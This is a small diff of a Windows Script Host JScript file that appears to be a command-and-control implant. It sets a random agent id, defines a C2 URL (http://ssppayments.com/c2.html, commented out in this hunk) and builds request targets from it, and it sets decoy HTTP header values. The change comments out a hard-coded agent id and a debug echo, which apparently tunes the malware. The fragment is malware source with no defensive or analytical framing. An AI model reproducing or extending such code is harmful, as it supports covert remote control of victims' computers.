@@ -12,8 +12,8 @@ var xFrameOptions = "SAMEORIGIN";
 var contentEncoding = "gzip";
 var contentType = "text/xml";
 var agentid = Math.floor(Math.random() * 99999999).toString();
-agentid = "24464333";
-WScript.Echo(agentid);
+//agentid = "24463333";
+//WScript.Echo(agentid);
 //var c2url = "http://ssppayments.com/c2.html";
 
 var target = c2url + uri;
